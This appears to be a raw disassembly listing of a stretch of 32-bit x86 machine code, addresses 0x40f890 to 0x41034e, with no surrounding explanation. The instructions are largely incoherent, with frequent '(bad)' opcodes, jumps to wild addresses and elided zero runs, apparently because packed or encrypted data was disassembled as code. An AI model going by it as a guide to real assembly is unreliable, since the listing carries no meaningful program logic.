  40f890:	cmc    
  40f891:	cmp    ecx,0xd
  40f894:	fisttp QWORD PTR [ecx]
  40f896:	fs and bh,0x74
  40f89a:	push   edx
  40f89b:	(bad)  
  40f89d:	and    ecx,0x5b
  40f8a0:	data16 ja 0x40f855
  40f8a3:	cdq    
  40f8a4:	pop    esi
  40f8a5:	jmp    0x17fbd77a
  40f8aa:	ins    BYTE PTR es:[edi],dx
  40f8ab:	sub    eax,DWORD PTR [ecx+0x1e]
  40f8ae:	mov    ebx,0xe54458c
  40f8b3:	mov    WORD PTR [ebx-0x1af94eed],?
  40f8b9:	call   0xf5825bf0
  40f8be:	mov    ds:0x5fdc258c,eax
  40f8c3:	ficomp DWORD PTR ds:0xe83fa6e9
  40f8c9:	add    edi,DWORD PTR [esi]
  40f8cb:	fisubr WORD PTR [edx+0x3cd6b717]
  40f8d1:	jmp    0xfbd2:0x27698c78
  40f8d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8d9:	add    edi,DWORD PTR ds:0x8d5ba706
  40f8df:	sti    
  40f8e0:	daa    
  40f8e1:	add    al,0x59
  40f8e3:	(bad)  
  40f8e4:	xchg   esp,eax
  40f8e5:	jmp    0x5901853a
	...
  40f912:	add    BYTE PTR [eax],al
  40f914:	fistp  DWORD PTR [edx-0x17]
  40f917:	cld    
  40f918:	add    DWORD PTR [edi],0x22ef5c14
  40f91e:	sub    BYTE PTR [ecx+esi*1],al
  40f921:	push   es
  40f922:	fstp   st(3)
  40f924:	mov    dh,0xd6
  40f926:	lods   eax,DWORD PTR ds:[esi]
  40f927:	call   0xe99dbf4c
  40f92c:	sbb    BYTE PTR [eax+edi*1-0x6a291124],cl
  40f933:	call   0x428fcb1
  40f938:	adc    ebp,ecx
  40f93a:	sbb    cl,ch
  40f93c:	jb     0x40f9a1
  40f93e:	xchg   ecx,eax
  40f93f:	(bad)  
  40f940:	fwait
  40f941:	mov    edi,edi
  40f943:	jne    0x40f94a
  40f945:	mov    ds:0x82d66e7f,al
  40f94a:	shr    ecx,cl
  40f94c:	cmp    eax,0x5d3d685b
  40f951:	sbb    al,BYTE PTR [eax]
  40f953:	push   esi
  40f954:	cwde   
  40f955:	(bad)  
  40f956:	std    
  40f957:	dec    esi
  40f958:	(bad)  
  40f959:	jae    0x40f983
  40f95b:	aam    0x3d
  40f95d:	pop    ebx
  40f95e:	or     ebp,DWORD PTR [ecx]
  40f960:	and    DWORD PTR ds:0x1a657868,edi
  40f966:	add    BYTE PTR [esi],ch
  40f968:	adc    BYTE PTR [edi-0x18],ah
  40f96b:	stos   BYTE PTR es:[edi],al
  40f96c:	sbb    DWORD PTR [ebp-0x381fe102],ecx
  40f972:	std    
  40f973:	push   ss
  40f974:	xchg   esi,eax
  40f975:	sbb    ebp,eax
  40f977:	bound  eax,QWORD PTR [eax]
	...
  40f9a1:	add    BYTE PTR [ecx],al
  40f9a3:	(bad)  
  40f9a4:	(bad)  
  40f9a5:	cdq    
  40f9a6:	pushw  es
  40f9a8:	adc    dh,bh
  40f9aa:	jecxz  0x40fa0a
  40f9ac:	push   eax
  40f9ad:	neg    bl
  40f9af:	(bad)  
  40f9b0:	call   0xfecd4f11
  40f9b5:	sar    DWORD PTR [ebp+0x59deff0b],1
  40f9bb:	(bad)  
  40f9bc:	mov    bl,0xd7
  40f9be:	popa   
  40f9bf:	mov    edi,fs
  40f9c1:	pop    ds
  40f9c2:	in     eax,0x5a
  40f9c4:	add    BYTE PTR [edx+0x2a],ch
  40f9c7:	pop    ebp
  40f9c8:	jb     0x40f99f
  40f9ca:	mov    ah,0xef
  40f9cc:	mov    bl,0xb7
  40f9ce:	and    DWORD PTR [edx+0x74bd9902],ecx
  40f9d4:	add    DWORD PTR [edi],ecx
  40f9d6:	ret    
  40f9d7:	inc    esp
  40f9d8:	sbb    cl,BYTE PTR cs:[edi+0x6a29eb5d]
  40f9df:	jbe    0x40fa40
  40f9e1:	sub    BYTE PTR [edx],bh
  40f9e3:	mov    dh,BYTE PTR [eax+eax*1-0x27ec5]
  40f9ea:	iret   
  40f9eb:	sahf   
  40f9ec:	push   0x0
  40f9ee:	xlat   BYTE PTR ds:[ebx]
  40f9ef:	cs push 0x2037f7
  40f9f5:	(bad)  
  40f9f6:	mov    edx,0x70fffccb
  40f9fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f9fc:	mov    al,0x6c
  40f9fe:	xlat   BYTE PTR ds:[ebx]
  40f9ff:	pop    esi
  40fa00:	push   eax
  40fa01:	push   0x40ffdb
	...
  40fa2e:	add    BYTE PTR [eax],al
  40fa30:	add    ah,cl
  40fa32:	mov    dl,0xfe
  40fa34:	jo     0x40f9b8
  40fa36:	out    0xa1,al
  40fa38:	sbb    DWORD PTR [esi+0x0],0x5a
  40fa3c:	into   
  40fa3d:	test   DWORD PTR [esi-0x2f7a708b],edi
  40fa43:	jne    0x40f9e0
  40fa45:	test   edi,eax
  40fa47:	je     0x40f9ca
  40fa49:	es mov cl,0x48
  40fa4c:	(bad)  
  40fa4d:	pop    esi
  40fa4e:	push   DWORD PTR [ebp-0x65]
  40fa51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa52:	scas   eax,DWORD PTR es:[edi]
  40fa53:	xor    DWORD PTR [eax-0x7f],0xfffffffd
  40fa57:	mov    ch,0x2b
  40fa59:	cmp    ebp,0xf7a6c7ff
  40fa5f:	and    DWORD PTR [eax-0x7f],0x4e
  40fa63:	(bad)  
  40fa64:	jmp    0xff2e:0x6375ff6e
  40fa6b:	jne    0x40facc
  40fa6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa6e:	data16 cli 
  40fa70:	add    BYTE PTR [ecx-0x7d8f0e1a],al
  40fa76:	std    
  40fa77:	lea    ebx,[edx-0x2f000364]
  40fa7d:	sub    eax,0x80a3b5ff
  40fa82:	std    
  40fa83:	jmp    FWORD PTR [edi+0x3e006b12]
  40fa89:	je     0x40fb0a
  40fa8b:	mov    edi,0xfe1fff31
  40fa90:	stc    
  40fa91:	loopne 0x40fa78
  40fa93:	mov    ah,0x0
	...
  40fabd:	add    BYTE PTR [edx-0x290119f7],dh
  40fac3:	arpl   WORD PTR [ebx+0x0],bx
  40fac6:	ds stc 
  40fac8:	scas   eax,DWORD PTR es:[edi]
  40fac9:	mov    bh,0xd8
  40facb:	add    dh,ah
  40facd:	out    0xff,eax
  40facf:	test   al,0xe5
  40fad1:	(bad)  
  40fad2:	div    DWORD PTR ds:0xfd6b0013
  40fad8:	(bad)  
  40fad9:	(bad)  
  40fada:	xor    edx,DWORD PTR [eax+0x494e74e5]
  40fae0:	jo     0x40faee
  40fae2:	test   eax,0x2be7fac6
  40fae7:	aaa    
  40fae8:	out    0xfe,al
  40faea:	xchg   DWORD PTR ds:0xceafff7,esi
  40faf0:	xlat   BYTE PTR ds:[ebx]
  40faf1:	add    BYTE PTR [edx+0xbff4e63],0xa8
  40faf8:	fidivr DWORD PTR [edx+0xae660c2]
  40fafe:	jle    0x40fb0e
  40fb00:	add    BYTE PTR [edi+0x77],bl
  40fb03:	xor    eax,0xe60fff7
  40fb08:	adc    ebp,eax
  40fb0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb0b:	mul    esp
  40fb0d:	inc    BYTE PTR [ebp-0x4c]
  40fb10:	outs   dx,BYTE PTR ds:[esi]
  40fb11:	add    eax,0xbc1bae9
  40fb16:	ds cdq 
  40fb18:	outs   dx,BYTE PTR ds:[esi]
  40fb19:	or     al,0x26
  40fb1b:	mov    bh,0x79
  40fb1d:	(bad)  
  40fb1e:	xor    DWORD PTR [esi+0x74c2],ecx
	...
  40fb4c:	cmp    DWORD PTR [edx],ebx
  40fb4e:	mov    bl,0x47
  40fb50:	jg     0x40fbc4
  40fb52:	jecxz  0x40fbc8
  40fb54:	dec    edx
  40fb55:	pop    ebx
  40fb56:	xchg   ecx,eax
  40fb57:	add    bh,BYTE PTR [ebp+0x37d99d88]
  40fb5d:	cmc    
  40fb5e:	call   0x81988647
  40fb63:	out    dx,al
  40fb64:	mov    edi,0x7a7b8588
  40fb69:	(bad)  
  40fb6a:	adc    BYTE PTR [eax-0x1b16e577],ah
  40fb70:	push   0xffffff8f
  40fb72:	sbb    dh,0xbf
  40fb75:	mov    BYTE PTR [ebp+0x7b],ah
  40fb78:	jp     0x40fafd
  40fb7a:	rcr    cl,1
  40fb7c:	retf   0xe95b
  40fb7f:	fld    TBYTE PTR [esi+0x8]
  40fb82:	dec    esi
  40fb83:	in     eax,0xc6
  40fb85:	push   ds
  40fb86:	inc    ebp
  40fb87:	pop    esp
  40fb88:	ds imul ebp,ecx,0x3
  40fb8c:	xchg   esi,eax
  40fb8d:	pop    ds
  40fb8e:	mov    dh,0xe4
  40fb90:	mov    al,ds:0x98f3a3d2
  40fb95:	push   cs
  40fb96:	and    esp,ebx
  40fb98:	nop
  40fb99:	fcomp  QWORD PTR ds:0xe59b34e5
  40fb9f:	jg     0x40fb63
  40fba1:	pop    ebx
  40fba2:	jmp    0x14f74aa
  40fba7:	pop    esp
  40fba8:	data16 xchg al,ch
  40fbab:	add    ebp,DWORD PTR [ecx+0xe]
  40fbae:	cmc    
  40fbaf:	fild   DWORD PTR [eax]
	...
  40fbd9:	add    BYTE PTR [ebx-0x42fc170b],ah
  40fbdf:	sub    edx,0xfffffff4
  40fbe2:	mov    ebx,0x3e03e8bf
  40fbe7:	aam    0x53
  40fbe9:	call   0xf52a43af
  40fbee:	mov    ebp,0x3e03e8e2
  40fbf3:	repz ja 0x40fc59
  40fbf6:	jg     0x40fc53
  40fbf8:	add    BYTE PTR [esi],bl
  40fbfa:	add    ah,BYTE PTR [esi]
  40fbfc:	imul   ebp,ecx,0x3d
  40fbff:	push   esp
  40fc00:	rcr    BYTE PTR ds:0xa17488a3,0x65
  40fc07:	mov    BYTE PTR [esi],cl
  40fc09:	jmp    0x99b5844b
  40fc0e:	xchg   ebp,eax
  40fc0f:	int3   
  40fc10:	inc    edi
  40fc11:	sub    BYTE PTR [edx],bh
  40fc13:	repz ret 
  40fc15:	or     DWORD PTR [ebp+0x5b],edi
  40fc18:	push   edi
  40fc19:	sub    DWORD PTR [esi-0xb],0xc7d6e8ff
  40fc20:	jae    0x40fbe3
  40fc22:	fimul  DWORD PTR [esi]
  40fc24:	clc    
  40fc25:	sar    DWORD PTR [ebx+esi*8],cl
  40fc28:	mov    eax,0x575b7cc9
  40fc2d:	inc    ecx
  40fc2e:	sub    al,0xf5
  40fc30:	(bad)  
  40fc31:	call   0xb4418bf4
  40fc36:	pop    eax
  40fc37:	mov    BYTE PTR [ecx+edi*1-0x66],dh
  40fc3b:	push   cs
  40fc3c:	hlt    
  40fc3d:	inc    ecx
	...
  40fc66:	add    BYTE PTR [eax],al
  40fc68:	pop    ebx
  40fc69:	(bad)  
  40fc6b:	es in  eax,dx
  40fc6d:	ror    edi,cl
  40fc6f:	adc    al,BYTE PTR [edi+eax*1+0x5c10c63a]
  40fc76:	(bad)  
  40fc77:	jmp    0x40fc7a
  40fc79:	sbb    eax,0x5de11b0b
  40fc7e:	add    bl,0x3d
  40fc81:	push   cs
  40fc82:	out    dx,al
  40fc83:	not    bl
  40fc85:	push   0x50
  40fc87:	out    dx,al
  40fc88:	jmp    0x40fcdc
  40fc8a:	call   0xfec9593d
  40fc8f:	rcr    ebp,1
  40fc91:	or     bh,bh
  40fc93:	(bad)  
  40fc94:	push   ecx
  40fc95:	push   ebp
  40fc96:	call   DWORD PTR [edx+esi*1-0x7a]
  40fc9a:	je     0x40fc9c
  40fc9c:	idiv   DWORD PTR [edx+0x73]
  40fc9f:	or     BYTE PTR [edi],cl
  40fca1:	out    dx,al
  40fca2:	cld    
  40fca3:	(bad)  
  40fca4:	call   0x8f012e24
  40fca9:	jp     0x40fca8
  40fcab:	(bad)  
  40fcac:	fsubr  DWORD PTR [ebp+0x6a2038ac]
  40fcb2:	test   DWORD PTR [eax-0x58],ebp
  40fcb5:	jp     0x40fcb4
  40fcb7:	call   DWORD PTR [edx-0x5d]
  40fcba:	out    0x55,al
  40fcbc:	cmp    DWORD PTR [edx-0x3],edi
  40fcbf:	push   edx
  40fcc1:	stos   BYTE PTR es:[edi],al
  40fcc2:	out    0x4d,al
  40fcc4:	jmp    0xd340fa42
  40fcc9:	mov    ds:0x45e6,al
	...
  40fcf6:	fnstcw WORD PTR [ecx-0x3]
  40fcf9:	push   edx
  40fcfb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fcfc:	out    0x3d,al
  40fcfe:	jmp    0x9340fa7c
  40fd03:	mov    bh,ch
  40fd05:	jne    0x40fcb2
  40fd07:	jns    0x40fd7c
  40fd09:	or     BYTE PTR [edi],cl
  40fd0b:	sub    eax,0x1a68fffe
  40fd10:	leave  
  40fd11:	ret    0x5a7b
  40fd14:	push   ebp
  40fd15:	mov    ebp,DWORD PTR [ebx]
  40fd17:	faddp  st(2),st
  40fd19:	call   0xff552146
  40fd1e:	mov    ds:0xbd8de68a,al
  40fd23:	pop    edx
  40fd24:	add    BYTE PTR [ebx],cl
  40fd26:	daa    
  40fd27:	and    edx,DWORD PTR [edi+0x6a]
  40fd2a:	push   edi
  40fd2b:	repnz enter 0x9660,0x5a
  40fd30:	push   DWORD PTR [ebp+0x77]
  40fd33:	jns    0x40fda8
  40fd35:	or     al,0x6f
  40fd37:	test   DWORD PTR [edi-0x1],edi
  40fd3a:	push   0x3e74c055
  40fd3f:	xor    esi,DWORD PTR [eax+edx*2]
  40fd42:	es mov edx,0x8931fe89
  40fd48:	ret    0x6f73
  40fd4b:	or     ecx,DWORD PTR [eax-0x18]
  40fd4e:	xchg   esp,eax
  40fd4f:	stos   BYTE PTR es:[edi],al
  40fd50:	jmp    0xfe0a:0xe1b4bc41
  40fd57:	addr16 (bad) 
  40fd59:	inc    BYTE PTR [eax]
	...
  40fd83:	add    BYTE PTR [ebx-0x1117cba4],dl
  40fd89:	repnz loope 0x40fd8a
  40fd8c:	mov    ss,ebp
  40fd8e:	push   edi
  40fd8f:	call   0x898db22
  40fd94:	(bad)  
  40fd95:	test   al,0xe0
  40fd97:	(bad)  
  40fd98:	loope  0x40fd75
  40fd9a:	int    0x7c
  40fd9c:	fxtract 
  40fd9e:	loope  0x40fe14
  40fda0:	out    0x2b,al
  40fda2:	(bad)  
  40fda3:	jl     0x40fd6e
  40fda5:	and    al,0xeb
  40fda7:	mov    ebp,0x67e22d43
  40fdac:	ds jl  0x40fdb1
  40fdaf:	add    BYTE PTR [esi-0x56009fb8],ah
  40fdb5:	or     cl,BYTE PTR [eax-0x8]
  40fdb8:	mov    bl,0xb6
  40fdba:	fimul  WORD PTR [edi-0x67]
  40fdbd:	into   
  40fdbe:	repnz dec BYTE PTR [ebx]
  40fdc1:	nop
  40fdc2:	jmp    0x7e0b:0x27417d3
  40fdc9:	out    0x52,al
  40fdcb:	mov    DWORD PTR [ebx],0x3e000364
  40fdd1:	je     0x40fd9c
  40fdd3:	inc    esp
  40fdd4:	jb     0x40fd5a
  40fdd6:	or     BYTE PTR [eax],al
  40fdd8:	fiadd  DWORD PTR ds:[edx]
  40fddb:	push   0x3e
  40fddd:	fiadd  DWORD PTR [edx]
  40fddf:	push   0x3e
  40fde1:	pop    ebx
  40fde2:	je     0x40fe2b
  40fde4:	push   edx
  40fde5:	sub    bl,dh
  40fde7:	push   edi
	...
  40fe10:	add    BYTE PTR [eax],al
  40fe12:	inc    esi
  40fe13:	test   DWORD PTR [ebx-0x2c],ebx
  40fe16:	cmp    BYTE PTR [edi],cl
  40fe18:	int    0xec
  40fe1a:	jecxz  0x40fe0e
  40fe1c:	call   0x34dc3324
  40fe21:	push   es
  40fe22:	adc    eax,0x81934142
  40fe27:	sbb    ch,cl
  40fe29:	loopne 0x40fdb5
  40fe2b:	imul   edx,DWORD PTR [ecx-0x627b40fa],0xffffffe1
  40fe32:	mov    al,BYTE PTR [ebx-0x257513c8]
  40fe38:	(bad)  
  40fe39:	loope  0x40fe01
  40fe3b:	push   ds
  40fe3c:	xchg   ebp,eax
  40fe3d:	loope  0x40feb1
  40fe3f:	arpl   WORD PTR [esi+0x57],di
  40fe42:	dec    edx
  40fe43:	test   bl,bh
  40fe45:	out    dx,eax
  40fe46:	fmul   DWORD PTR [esi]
  40fe48:	fucom  st(0)
  40fe4a:	dec    edx
  40fe4b:	push   ebx
  40fe4c:	push   ecx
  40fe4d:	sti    
  40fe4e:	enter  0x5d84,0xe1
  40fe52:	dec    edx
  40fe53:	ja     0x40fe95
  40fe55:	sbb    eax,0xe14d843b
  40fe5a:	cli    
  40fe5b:	mov    dl,BYTE PTR [ecx-0x7f]
  40fe5e:	test   al,0xe
  40fe60:	cmp    eax,0xe8f207ec
  40fe65:	add    ebx,DWORD PTR [ecx+0x5bec310e]
  40fe6b:	push   es
  40fe6c:	es loope 0x40fee5
  40fe6f:	cdq    
  40fe70:	hlt    
  40fe71:	add    ebp,ebx
  40fe73:	iret   
  40fe74:	add    al,0x83
	...
  40fe9e:	add    BYTE PTR [eax],al
  40fea0:	jge    0x40fe31
  40fea2:	push   cs
  40fea3:	loope  0x40ff15
  40fea5:	icebp  
  40fea6:	call   0x73c52118
  40feab:	or     edx,DWORD PTR [esi+0x1e]
  40feae:	add    BYTE PTR [ebx+0x5e],dh
  40feb1:	test   DWORD PTR [eax+0x49d71a4],ecx
  40feb7:	test   ebp,ebx
  40feb9:	sbb    DWORD PTR [eax],eax
  40febb:	jmp    0x644159fd
  40fec0:	ror    BYTE PTR [ebp+edi*8+0x68141ece],0xed
  40fec8:	cmp    al,0x5b
  40feca:	add    cl,dl
  40fecc:	out    dx,al
  40fecd:	sti    
  40fece:	(bad)  
  40fecf:	call   0x28a1ef79
  40fed4:	cmp    dh,bl
  40fed6:	bound  ecx,QWORD PTR [eax]
  40fed8:	jge    0x40ff35
  40feda:	push   0x1a9d1c
  40fedf:	xchg   esi,eax
  40fee0:	push   eax
  40fee1:	scas   al,BYTE PTR es:[edi]
  40fee2:	inc    edi
  40fee3:	sub    BYTE PTR [edx],bh
  40fee5:	test   BYTE PTR [ecx+esi*8-0x2b],dh
  40fee9:	mov    ebx,0xfbde7efd
  40feee:	push   0x8
  40fef0:	jge    0x40ff4d
  40fef2:	push   0x1a5d0a
  40fef7:	shr    DWORD PTR [eax-0x6],1
  40fefa:	inc    eax
  40fefb:	jmp    0xe9415855
  40ff00:	mov    ebp,0xe17484
	...
  40ff2d:	add    BYTE PTR [ebp-0x61b90231],ah
  40ff33:	(bad)  
  40ff34:	test   BYTE PTR [esi],dh
  40ff36:	lahf   
  40ff37:	test   dh,bh
  40ff39:	cdq    
  40ff3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff3b:	sub    ebp,DWORD PTR [eax-0x17]
  40ff3e:	cmp    eax,0x9e257484
  40ff43:	push   cs
  40ff44:	or     BYTE PTR [ecx],dl
  40ff46:	add    BYTE PTR [ecx],0xff
  40ff49:	push   ss
  40ff4a:	test   BYTE PTR [ecx-0x2fd716fd],bl
  40ff50:	jmp    0x40ff52
  40ff52:	(bad)  
  40ff53:	fwait
  40ff54:	repnz (bad) 
  40ff56:	pusha  
  40ff57:	mov    ds:0x3cbd0068,eax
  40ff5c:	push   DWORD PTR [ebp+0x5f]
  40ff5f:	outs   dx,DWORD PTR ds:[esi]
  40ff60:	mov    esp,0x87a36079
  40ff65:	inc    ebp
  40ff66:	arpl   ax,si
  40ff68:	sbb    eax,ebp
  40ff6a:	sti    
  40ff6b:	xlat   BYTE PTR ds:[ebx]
  40ff6c:	std    
  40ff6d:	call   FWORD PTR [edi+ebx*4]
  40ff70:	jb     0x40ff96
  40ff72:	(bad)  
  40ff73:	mul    BYTE PTR [eax+0x41]
  40ff76:	pop    ss
  40ff77:	dec    edi
  40ff78:	call   0xfde3a6dd
  40ff7d:	push   eax
  40ff7e:	jg     0x40ffd7
  40ff80:	adc    bh,ch
  40ff82:	mov    eax,ds:0x5661aeef
  40ff87:	push   edi
  40ff88:	push   eax
  40ff89:	call   FWORD PTR [edx+0x4f]
  40ff8c:	call   0xfde379dc
  40ff91:	call   0x40ff96
	...
  40ffba:	add    BYTE PTR [eax],al
  40ffbc:	dec    ebx
  40ffbd:	sti    
  40ffbe:	(bad)  
  40ffbf:	call   FWORD PTR [eax+0x26609c54]
  40ffc5:	push   edi
  40ffc6:	add    DWORD PTR [eax],eax
  40ffc8:	out    0x5e,eax
  40ffca:	lea    eax,[ebp-0x25e98]
  40ffd0:	xchg   esi,esi
  40ffd2:	add    eax,DWORD PTR [ecx]
  40ffd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ffd5:	pop    esi
  40ffd6:	call   0x9f78d4
  40ffdb:	push   0x40f78c
  40ffe0:	(bad)  
  40ffe1:	std    
  40ffe2:	pusha  
  40ffe3:	inc    ecx
  40ffe4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ffe5:	idiv   BYTE PTR [ecx+eiz*2-0x1a]
  40ffe9:	pop    esi
  40ffea:	push   DWORD PTR ds:0x410f4a
  40fff0:	and    BYTE PTR [eax+ecx*1],ah
  40fff3:	call   0xff226636
  40fff8:	jno    0x40ffd6
  40fffa:	imul   esp,DWORD PTR [ecx-0x1],0xdf636a73
  410001:	mov    dl,0x2
  410003:	push   0x43d2db
  410008:	out    0x75,al
  41000a:	add    al,BYTE PTR [eax]
  41000c:	mov    esi,0x56085779
  410011:	retf   0xfedf
  410014:	cmp    edi,esi
  410016:	xchg   esi,esi
  410018:	xor    BYTE PTR [ecx-0x29e9b023],dl
  41001e:	add    BYTE PTR gs:[eax],al
	...
  410049:	add    BYTE PTR [esi],bh
  41004b:	rcl    DWORD PTR [edi-0x4],0x19
  41004f:	aas    
  410050:	or     al,0xe8
  410052:	cdq    
  410053:	dec    ebx
  410054:	(bad)  
  410056:	div    DWORD PTR [ebp+0xd6b0006]
  41005c:	out    dx,eax
  41005d:	add    BYTE PTR [edx],0xe0
  410060:	fdiv   st(6),st
  410062:	icebp  
  410063:	pop    ebp
  410064:	add    al,0x6a
  410066:	and    cl,bl
  410068:	push   edi
  410069:	or     dh,dl
  41006b:	mov    ebx,DWORD PTR [ebx-0x1]
  41006e:	fsqrt  
  410070:	inc    edi
  410071:	cld    
  410072:	stc    
  410073:	jbe    0x4100f3
  410075:	pop    edi
  410076:	jg     0x4100ec
  410078:	add    al,BYTE PTR [eax]
  41007a:	ds je  0x41000c
  41007d:	test   BYTE PTR [ecx+0xefede29],dh
  410083:	pushf  
  410084:	push   es
  410085:	add    DWORD PTR [esi],edi
  410087:	je     0x410073
  410089:	jno    0x4100a4
  41008b:	je     0x41008f
  41008d:	push   0x439284
  410092:	es xor al,0x64
  410095:	inc    ecx
  410096:	ds pop ebx
  410098:	xchg   ecx,eax
  410099:	pusha  
  41009a:	pop    ds
  41009b:	sbb    al,0xe9
  41009d:	fidiv  WORD PTR [edx]
  41009f:	test   al,0xa0
  4100a1:	inc    esp
  4100a2:	adc    BYTE PTR ds:[ebx+0x3f5560b],0xde
  4100aa:	pusha  
  4100ab:	repnz xor ah,BYTE PTR [eax+eax*1+0x0]
	...
  4100d8:	call   FWORD PTR [edx-0x7f]
  4100db:	ret    
  4100dc:	ficomp WORD PTR [ebx]
  4100de:	jmp    0x283ccc4e
  4100e3:	add    al,0xd6
  4100e5:	pop    esp
  4100e6:	jmp    0x5bc1beee
  4100eb:	or     al,0x26
  4100ed:	adc    esp,ecx
  4100ef:	(bad)  [eax]
  4100f1:	iret   
  4100f2:	imul   edx,ebp,0x23
  4100f5:	cmp    DWORD PTR [ebp+0x4e652634],0x33803e04
  4100ff:	loopne 0x410109
  410101:	pop    es
  410102:	icebp  
  410103:	jmp    0x4100e6
  410105:	add    ebx,DWORD PTR [esi-0x1361f923]
  41010b:	add    ecx,DWORD PTR [ebx-0x27c832c]
  410111:	xchg   DWORD PTR [esi-0x170a1f23],eax
  410117:	imul   esp,DWORD PTR [ecx],0xe60bfb80
  41011d:	(bad)  
  41011f:	fmul   st(0),st
  410121:	shr    BYTE PTR [ebx+0x7d56f8df],cl
  410127:	call   FWORD PTR fs:[edx-0x17]
  41012b:	add    edi,DWORD PTR [esi]
  41012d:	pop    ebx
  41012e:	pop    esp
  41012f:	xchg   DWORD PTR [eax-0xe22ba7f],esi
  410135:	repnz in al,0x2
  410138:	ds pop ebx
  41013a:	add    BYTE PTR [ecx+0x0],al
	...
  410165:	add    BYTE PTR [edi+0x15e8fff6],ah
  41016b:	ja     0x4101cd
  41016d:	test   al,0x3d
  41016f:	repz fisttp QWORD PTR [eax-0x6b97a504]
  410176:	fcomp  QWORD PTR [ecx]
  410178:	add    BYTE PTR [esi],cl
  41017a:	push   ecx
  41017b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41017c:	inc    edi
  41017d:	test   al,0x3d
  41017f:	xor    BYTE PTR [ecx+esi*8+0x65],0x7c
  410184:	sti    
  410185:	div    BYTE PTR [edx-0x8]
  410188:	jecxz  0x410112
  41018a:	cld    
  41018b:	pop    edx
  41018c:	push   0x19dcc7
  410191:	push   ecx
  410192:	cdq    
  410193:	cli    
  410194:	inc    eax
  410195:	jmp    0xe9415f3f
  41019a:	mov    ebp,0x15f17480
  41019f:	cwde   
  4101a0:	sti    
  4101a1:	mov    esi,0xbe84cefa
  4101a6:	repz cmp dh,0x19
  4101aa:	sbb    ch,ah
  4101ac:	gs jmp 0x9db581ef
  4101b2:	sbb    al,BYTE PTR [edi]
  4101b4:	or     BYTE PTR [ecx-0x7100fccc],al
  4101ba:	hlt    
  4101bb:	cdq    
  4101bc:	add    ebp,ecx
  4101be:	sub    ah,dl
  4101c0:	jmp    0x41022a
  4101c2:	add    DWORD PTR [ebp+edi*8-0xe0d8a],ecx
  4101c9:	add    al,BYTE PTR [eax]
	...
  4101f3:	add    BYTE PTR [edx],bl
  4101f5:	xor    BYTE PTR [ecx+esi*8-0x2b],0x81
  4101fa:	jbe    0x41025a
  4101fc:	call   0x9c56:0x7a5544d2
  410203:	leave  
  410204:	cld    
  410205:	pop    edx
  410206:	add    BYTE PTR [eax],al
  410208:	xchg   edi,eax
  410209:	pop    ebx
  41020a:	add    BYTE PTR [ebp-0x358de],cl
  410210:	dec    eax
  410211:	dec    esp
  410212:	push   0x5b9604
  410217:	call   0x40f7cf
  41021c:	iret   
  41021d:	lahf   
  41021e:	pop    edi
  41021f:	inc    ecx
  410220:	addr16 repz repz popa 
  410224:	xchg   esi,eax
  410225:	pop    ebx
  410226:	push   0x1cb67d
  41022b:	call   DWORD PTR [edx+0x674146c8]
  410231:	sahf   
  410232:	jae    0x41023c
  410234:	aas    
  410235:	inc    ecx
  410236:	cld    
  410237:	call   FWORD PTR [eax-0x12]
  41023a:	sti    
  41023b:	popa   
  41023c:	push   di
  41023e:	push   0x1886f4
  410243:	push   0x40f87a
  410248:	(bad)  
  410249:	push   ebp
  41024a:	add    BYTE PTR [eax],al
  41024c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41024d:	mov    ds:0x18ff0873,al
  410252:	cld    
  410253:	(bad)  
  410254:	fcom   st(4)
  410256:	xor    edi,0x0
	...
  410281:	add    cl,bl
  410283:	mov    ds:0x54cf50fd,al
  410288:	data16 add bh,ah
  41028b:	mov    eax,ds:0x2cb8fc73
  410290:	or     al,ch
  410292:	lds    ebp,FWORD PTR [edx]
  410294:	(bad)  
  410295:	dec    DWORD PTR [esi+0x32000295]
  41029b:	into   
  41029c:	jmp    0xed00:0x68a3a383
  4102a3:	das    
  4102a4:	push   DWORD PTR [ebp-0x51]
  4102a7:	jb     0x41031d
  4102a9:	ja     0x4102e9
  4102ab:	and    eax,0x100388db
  4102b0:	outs   dx,BYTE PTR ds:[esi]
  4102b1:	add    BYTE PTR [esi],dl
  4102b3:	push   ebx
  4102b4:	inc    cx
  4102b6:	lods   al,BYTE PTR ds:[esi]
  4102b8:	or     DWORD PTR [edx-0x1],esp
  4102bb:	jae    0x410296
  4102bd:	xor    al,0x73
  4102bf:	mov    esp,0x78960043
  4102c4:	push   edi
  4102c5:	(bad)  
  4102c6:	jns    0x410251
  4102c8:	ret    0x5773
  4102cb:	les    ebp,FWORD PTR [edx+0x0]
  4102ce:	ds jge 0x410269
  4102d1:	addr16 das 
  4102d3:	rol    BYTE PTR [ebx+0x0],cl
  4102d6:	out    dx,al
  4102d7:	jl     0x410328
  4102d9:	or     BYTE PTR [esi-0x7a],ah
  4102dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4102dd:	dec    BYTE PTR [ecx+0x5c]
  4102e0:	add    edi,DWORD PTR [edx+0x41]
  4102e3:	jne    0x410351
	...
  41030d:	add    BYTE PTR [eax],al
  41030f:	add    BYTE PTR [esi+0x3e41666c],ah
  410315:	sbb    al,0xb
  410317:	bound  edi,QWORD PTR [edi+0x74]
  41031a:	fnstenv [ebx+ecx*1]
  41031d:	dec    esp
  41031e:	inc    ebp
  41031f:	add    BYTE PTR [esi],ah
  410321:	mov    WORD PTR [edi-0x1],ss
  410324:	adc    DWORD PTR [ecx-0x3e],edi
  410327:	jae    0x410350
  410329:	fs ins BYTE PTR es:[edi],dx
  41032b:	add    BYTE PTR [esi],bh
  41032d:	in     eax,0x98
  41032f:	addr16 das 
  410331:	push   edx
  410332:	inc    ebp
  410333:	add    BYTE PTR [esi-0x29f7b01b],cl
  410339:	mov    ecx,0xebe1fea4
  41033e:	mov    ch,0x78
  410340:	frndint 
  410342:	fnstenv [edx+edx*8+0x4]
  410346:	push   eax
  410347:	or     dh,dl
  410349:	xor    eax,0x5ac1ff53
  41034e:	xor    ch,al
